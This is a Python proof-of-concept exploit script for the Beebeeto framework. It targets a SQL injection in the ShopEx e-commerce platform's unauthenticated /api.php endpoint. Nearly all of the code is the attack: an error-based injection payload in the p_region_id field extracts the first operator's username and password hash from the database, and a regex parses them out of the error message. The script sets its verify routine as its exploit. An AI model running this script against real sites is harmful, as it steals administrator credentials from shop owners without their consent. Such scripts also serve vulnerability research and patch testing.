#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0041',           # 由Beebeeto官方编辑
            'name': 'ShopEx /api.php SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-29',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ShopEx',  # 漏洞所涉及的应用名称
            'vul_version': ['*'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['ShopEx', 'SQL Injection', 'ShopEx漏洞', '信息泄露漏洞'],  # 漏洞相关tag
            'desc': 'ShopEx对API操作的模块未做认证，任何用户都可访问,攻击者可通过它来对产品的分类，'\
                    '类型，规格，品牌等，进行添加，删除和修改，过滤不当还可造成注入',  # 漏洞描述
            'references': ['http://www.cnseay.com/3237/'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']+"/api.php"
        postDataExp = ("act=search_sub_regions&api_version=1.0&return_data=string&"
                       "p_region_id=22 and (select 1 from(select count(*),concat(0x7c,"
                       "(select concat(0x245E,username,0x2D3E,userpass,0x5E24) from "
                       "sdb_operators limit 0,1),0x7c,floor(rand(0)*2))x from "
                       "information_schema.tables group by x limit 0,1)a)#")

        req = urllib2.Request(url = verify_url, data = postDataExp)
        response = urllib2.urlopen(req,timeout = 10)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = response.read()
        if content == None:
            args['success'] = False
            return args
        pattern = re.compile(r".*?Duplicate\s*entry\s*'\|\$\^(?P<username>[\w]+)->(?P<password>[a-zA-Z0-9]+)")
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())